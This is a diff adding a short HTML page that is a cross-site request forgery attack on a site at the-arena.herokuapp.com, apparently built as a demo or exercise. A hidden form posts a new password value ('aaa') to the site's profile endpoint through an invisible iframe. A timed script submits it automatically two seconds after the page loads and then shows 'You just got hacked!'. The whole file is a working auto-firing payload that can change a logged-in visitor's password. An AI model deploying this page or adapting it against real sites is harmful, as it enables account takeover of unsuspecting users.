@@ -1,0 +1,17 @@
+<html>
+  <head></head>
+  <body>
+    <form id='attack' action='https://the-arena.herokuapp.com/profile' method='post'target='hidden-iframe'>
+      <input type='hidden' name='password' value='aaa' />
+    </form>
+    <iframe style='display: none' name='hidden-iframe'></iframe>
+  <script>
+    setTimeout(function() {
+      document.getElementById('attack').submit();
+      element = document.createElement('p');
+      element.innerHTML = 'You just got hacked!';
+      document.body.appendChild(element);
+    }, 2000);
+  </script>
+  </body>
+</html>
